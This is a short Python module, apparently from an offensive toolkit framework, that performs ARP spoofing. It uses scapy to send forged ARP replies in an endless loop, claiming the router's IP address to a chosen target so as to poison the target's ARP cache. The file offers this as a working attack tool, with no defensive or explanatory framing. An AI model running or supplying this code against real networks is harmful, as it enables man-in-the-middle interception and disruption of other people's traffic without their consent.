#		Copyright (C) 2015 Noa-Emil Nissinen (4shadoww)
from core import colors
import subprocess
from scapy.all import *
from time import sleep
from collections import OrderedDict


conf = {
	"name": "arp_spoof",
	"version": "1.0",
	"shortdesc": "arp spoof",
	"github": "4shadoww",
	"author": "4shadoww",
	"email": "4shadoww0@gmail.com",
	"initdate": "10.3.2016",
	"lastmod": "27.12.2016",
	"apisupport": False,
	"needroot": 1
}


# List of the variables
variables = OrderedDict((
	('target', ['192.168.1.3', 'target ip address']),
	('router', ['192.168.1.1', 'router ip address'])
))


# Additional help notes
help_notes = colors.red+"this module will not work without root permission!"+colors.end

# Simple changelog
changelog = "Version 1.0:\nrelease"

def run():
	print (colors.blue + "[*]Setting Up ..." + colors.end)
	print(colors.green + "[OK]" + colors.end)
	sleep(1)
	print(colors.blue + "[*]ARP Poisoning Has Been Started ..." + colors.end)
	packet = ARP()
	packet.psrc = variables['router'][0]
	packet.pdst = variables['target'][0]
	while 1:
		send(packet, verbose=False)
		sleep(1)